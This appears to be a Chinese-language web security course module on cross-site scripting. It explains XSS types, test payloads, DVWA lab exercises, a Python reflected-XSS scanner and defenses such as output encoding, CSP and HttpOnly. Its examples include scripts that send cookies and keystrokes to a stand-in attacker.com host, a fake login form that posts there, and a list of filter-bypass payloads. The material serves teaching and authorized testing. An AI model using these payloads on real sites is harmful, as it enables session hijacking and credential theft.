# 03 XSS攻击 —— 跨站脚本的前世今生

> **XSS是Web中最常见的漏洞，没有之一。**
> 它的本质和SQL注入一样——用户输入被当成代码执行了。
> 只不过SQL注入在后端执行SQL，XSS在前端（浏览器）执行JavaScript。

---

## 一、XSS的本质

```
XSS = Cross-Site Scripting（跨站脚本攻击）
（本来应该缩写CSS，但和层叠样式表冲突了，所以用XSS）

本质：攻击者把恶意JavaScript代码注入到网页中，
      当其他用户浏览这个页面时，恶意代码在他们的浏览器里执行。

和SQL注入的对比：
  SQL注入：用户输入 → 拼接进SQL → 在数据库服务器执行
  XSS：    用户输入 → 拼接进HTML → 在受害者浏览器执行
```

**一个最简单的例子：**

```
假设有一个搜索功能：
  URL: https://target.com/search?q=手机
  页面显示：您搜索的是：手机

后端代码（有漏洞）：
  <p>您搜索的是：{{ user_input }}</p>

正常输入：
  q=手机
  → <p>您搜索的是：手机</p>

恶意输入：
  q=<script>alert('XSS')</script>
  → <p>您搜索的是：<script>alert('XSS')</script></p>

浏览器看到<script>标签 → 执行里面的JavaScript → 弹出对话框
```

---

## 二、XSS能做什么（危害）

`alert('XSS')` 只是证明漏洞存在。真实的XSS攻击可以：

### 2.1 偷Cookie（最经典）

```javascript
// 把受害者的Cookie发送到攻击者的服务器
<script>
new Image().src = "https://attacker.com/steal?cookie=" + document.cookie;
</script>

// 攻击者拿到Cookie后，设置到自己浏览器里 → 冒充受害者身份
// 这就是为什么Cookie要设HttpOnly —— 设了之后JavaScript读不到
```

### 2.2 键盘记录

```javascript
// 记录受害者在页面上的所有键盘输入
<script>
document.onkeypress = function(e) {
    new Image().src = "https://attacker.com/log?key=" + e.key;
}
</script>

// 如果是登录页面 → 记录到用户名和密码
```

### 2.3 钓鱼（页面篡改）

```javascript
// 在页面上弹出一个假的登录框
<script>
document.body.innerHTML = '<h1>会话已过期，请重新登录</h1>' +
    '<form action="https://attacker.com/phish">' +
    '<input name="user" placeholder="用户名">' +
    '<input name="pass" type="password" placeholder="密码">' +
    '<button>登录</button></form>';
</script>

// 用户以为是网站要求重新登录，实际把密码交给了攻击者
```

### 2.4 蠕虫传播

```
经典案例：2005年MySpace的Samy蠕虫
  - 利用存储型XSS
  - 用户A查看攻击者的个人主页 → 自动加攻击者好友 + 在A的主页也注入同样代码
  - A的好友查看A的主页 → 再次传播
  - 20小时内感染了100万用户
```

---

## 三、XSS三种类型

### 3.1 反射型XSS（Reflected XSS）

```
特点：恶意代码在URL中，不存入数据库，一次性的
流程：
  1. 攻击者构造恶意URL
  2. 诱骗受害者点击
  3. 服务器把URL中的参数原样返回到页面
  4. 受害者浏览器执行恶意代码

示例：
  正常URL：https://target.com/search?q=手机
  恶意URL：https://target.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

  攻击者把恶意URL通过邮件/聊天发给受害者
  受害者点击 → Cookie被偷走

为什么叫"反射"：输入从URL"反射"回页面
```

### 3.2 存储型XSS（Stored XSS）—— 危害最大

```
特点：恶意代码存入了数据库，所有看到该数据的用户都会被攻击
流程：
  1. 攻击者在评论/留言/个人资料中写入恶意代码
  2. 服务器把恶意代码存入数据库
  3. 其他用户查看包含恶意代码的页面
  4. 恶意代码在每个用户的浏览器中执行

示例：
  在论坛发帖，内容为：
  好文章！<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>

  每个查看这篇帖子的用户的Cookie都会被偷走

为什么危害最大：
  - 不需要诱骗点击，用户正常浏览就会中招
  - 影响所有查看该页面的用户
  - 代码持久存在，直到被删除
```

### 3.3 DOM型XSS（DOM-based XSS）

```
特点：恶意代码不经过服务器，完全在前端JavaScript中产生
流程：
  1. 页面JavaScript读取URL中的数据
  2. 不经过安全处理直接写入DOM
  3. 恶意代码执行

示例：
  前端代码（有漏洞）：
  var name = new URLSearchParams(location.search).get('name');
  document.getElementById('greeting').innerHTML = 'Hello, ' + name;

  恶意URL：
  https://target.com/welcome?name=<img src=x onerror=alert('XSS')>

  特殊之处：
  - 服务器返回的HTML是干净的
  - 恶意代码是JavaScript在客户端动态产生的
  - 所以服务端的安全过滤可能检测不到

常见的DOM XSS危险函数：
  document.innerHTML = ...       ← 最常见
  document.write(...)
  document.getElementById(...).outerHTML = ...
  eval(...)
  setTimeout(userInput, ...)
  location.href = userInput      ← 可能导致JavaScript伪协议执行
```

---

## 四、XSS检测实战

### 4.1 基本检测步骤

```
第1步：找到输入点和输出点
  输入点：搜索框、评论、用户名、个人简介、URL参数……
  输出点：输入的内容在哪里显示出来？

第2步：确定输出上下文
  输入出现在哪里，决定了用什么payload：

  [HTML标签之间]
  <p>你搜索的是：{输入}</p>
  → payload: <script>alert(1)</script>
  → payload: <img src=x onerror=alert(1)>

  [HTML属性中]
  <input value="{输入}">
  → payload: " onfocus=alert(1) autofocus="
  → payload: "><script>alert(1)</script>

  [JavaScript代码中]
  <script>var name = '{输入}';</script>
  → payload: '; alert(1); //
  → payload: '</script><script>alert(1)</script>

  [URL中]
  <a href="{输入}">链接</a>
  → payload: javascript:alert(1)

  [CSS中]（少见）
  <div style="background: {输入}">
  → payload: url(javascript:alert(1))  （仅旧浏览器）

第3步：测试和观察
  输入payload → 查看页面源码 → 观察你的输入是否被原样输出
  如果被编码了（< 变成 &lt;）→ 该位置可能是安全的
  如果原样输出 → 存在XSS漏洞
```

### 4.2 常用测试Payload

```html
<!-- 基础测试 -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>

<!-- 不用script标签（绕过简单过滤） -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>

<!-- 属性逃逸 -->
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='
"><img src=x onerror=alert(1)>

<!-- JavaScript上下文逃逸 -->
'; alert(1); //
'; alert(1); var a='
</script><script>alert(1)</script>

<!-- 编码绕过 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<script>eval(atob('YWxlcnQoMSk='))</script>

<!-- 大小写绕过 -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- 事件处理器（不需要尖括号） -->
' autofocus onfocus=alert(1) x='
" onmouseover=alert(1) "

<!-- JavaScript伪协议 -->
javascript:alert(1)
```

### 4.3 最小化验证Payload

```
测试时不需要一上来就用复杂payload。

第一步用最简单的：
  <script>alert(1)</script>

被过滤了？试试：
  <img src=x onerror=alert(1)>

还被过滤？试试不用尖括号：
  " onfocus=alert(1) autofocus="

还不行？分析过滤规则，针对性绕过。

确认漏洞存在后，再构造实际利用的payload。
```

---

## 五、XSS防御（理解防御才能找到绕过）

### 5.1 输出编码（最核心的防御）

```
原则：根据输出上下文，对特殊字符进行编码

HTML上下文：HTML实体编码
  < → &lt;
  > → &gt;
  " → &quot;
  ' → &#x27;
  & → &amp;

JavaScript上下文：JavaScript转义
  ' → \'
  " → \"
  \ → \\

URL上下文：URL编码
  < → %3C
  > → %3E

CSS上下文：CSS转义
  使用 \HH 格式

关键：编码方式必须匹配输出上下文。
  HTML编码放在JavaScript中无效，反之亦然。
  这是开发者最容易犯的错误 → 你测试的重点。
```

### 5.2 CSP（Content Security Policy）

```
CSP通过HTTP响应头限制页面能执行的脚本来源：

Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

含义：只允许加载本站和cdn.example.com的脚本

即使有XSS漏洞，注入的内联脚本也不会执行
（除非CSP配置了 'unsafe-inline'）

安全测试要检查：
  □ 有没有CSP头
  □ 有没有 'unsafe-inline'（等于没设）
  □ 有没有 'unsafe-eval'（允许eval，危险）
  □ 有没有过于宽泛的源（如 * 或 https:）
```

### 5.3 HttpOnly Cookie

```
Set-Cookie: session=abc123; HttpOnly

HttpOnly让JavaScript无法读取Cookie：
  document.cookie → 读不到设了HttpOnly的Cookie

所以即使有XSS，攻击者也偷不到Session Cookie。
但XSS仍然可以：
  - 发送已认证的请求（Cookie会自动携带）
  - 篡改页面内容
  - 键盘记录

所以HttpOnly是重要防线，但不是万能的。
```

---

## 六、动手实践

### 实践1：DVWA反射型XSS（Low级别）

```
1. DVWA → XSS (Reflected) 页面
2. 正常输入名字：test → 观察显示
3. 查看页面源码，找到你的输入在HTML中的位置
4. 输入：<script>alert('XSS')</script>
5. 弹窗了？→ 漏洞存在！
6. 进阶：试试偷Cookie
   <script>alert(document.cookie)</script>
7. 查看Medium级别的源码，看它怎么过滤的
8. 尝试绕过Medium级别的过滤
```

### 实践2：DVWA存储型XSS（Low级别）

```
1. DVWA → XSS (Stored) 页面（留言板）
2. 在Message字段输入：
   Hello! <script>alert('Stored XSS')</script>
3. 提交后每次刷新页面都会弹窗 → 存储型XSS
4. 思考：如果这是一个真实论坛，所有查看这条留言的用户都会中招
5. 进阶payload：
   <script>document.write('<img src=https://attacker.com/steal?c='+document.cookie+'>')</script>
```

### 实践3：DOM型XSS

```
1. DVWA → XSS (DOM) 页面
2. 观察URL和页面行为
3. 修改URL参数，注入payload
4. 查看页面源码——注意恶意代码不在服务器返回的HTML中
5. 用F12的Elements面板观察DOM变化
```

### 实践4：Python XSS扫描脚本

```python
"""简单的反射型XSS检测"""
import requests
from urllib.parse import urlencode

def test_xss(url, param_name):
    """测试一个参数是否存在反射型XSS"""
    payloads = [
        ("<script>alert(1)</script>", "<script>alert(1)</script>"),
        ("<img src=x onerror=alert(1)>", "<img src=x onerror=alert(1)>"),
        ('"><script>alert(1)</script>', '"><script>alert(1)</script>'),
        ("' onfocus=alert(1) autofocus='", "onfocus=alert(1)"),
        ("<svg onload=alert(1)>", "<svg onload=alert(1)>"),
    ]

    print(f"测试: {url} 参数: {param_name}\n")

    for payload, check_string in payloads:
        try:
            resp = requests.get(url, params={param_name: payload}, timeout=10)

            # 检查payload是否原样出现在响应中（未编码）
            if check_string in resp.text:
                print(f"  [可能存在XSS!] payload被原样反射:")
                print(f"    输入: {payload}")
                print(f"    在响应中找到: {check_string}")
            else:
                # 检查是否被部分编码
                if "&lt;script" in resp.text or "&lt;img" in resp.text:
                    print(f"  [安全] payload被HTML编码: {payload[:30]}...")
                else:
                    print(f"  [未反射] payload未出现在响应中: {payload[:30]}...")

        except Exception as e:
            print(f"  [错误] {e}")

# 使用示例
# test_xss("http://localhost:8081/vulnerabilities/xss_r/", "name")
```

---

## 七、XSS检查清单

```
每个输出用户输入的位置都应该测试：

基础检测：
  □ <script>alert(1)</script>
  □ <img src=x onerror=alert(1)>
  □ <svg onload=alert(1)>
  □ 查看响应源码，确认payload是否被编码

上下文判断：
  □ 输出在HTML标签之间？→ 用标签payload
  □ 输出在HTML属性中？→ 用属性逃逸payload
  □ 输出在JavaScript中？→ 用JS逃逸payload
  □ 输出在URL中？→ 试javascript:伪协议

存储型检测：
  □ 评论/留言/个人资料等持久化数据中注入
  □ 提交后退出，换账号查看是否触发

DOM型检测：
  □ 查看前端JS是否直接使用URL参数
  □ 搜索 innerHTML, document.write, eval
  □ URL片段（#后面的部分）是否被JS使用

防御检查：
  □ 响应是否有CSP头？策略是否严格？
  □ Cookie是否设了HttpOnly？
  □ 是否使用了安全的模板引擎（自动编码输出）？
```

---

## 八、自测清单

- [ ] XSS的本质是什么？和SQL注入有什么共同点？
- [ ] 反射型、存储型、DOM型XSS的区别？哪个危害最大？
- [ ] XSS能造成哪些实际危害（不只是弹窗）？
- [ ] 看到 `<p>Hello, {用户输入}</p>` 你会用什么payload？
- [ ] 看到 `<input value="{用户输入}">` 你会用什么payload？
- [ ] CSP是什么？'unsafe-inline' 为什么危险？
- [ ] HttpOnly能完全防御XSS吗？为什么？
- [ ] 能在DVWA上完成反射型和存储型XSS？

---

> **下一模块：** [04 CSRF攻击](../04-csrf/README.md) —— 借刀杀人的艺术
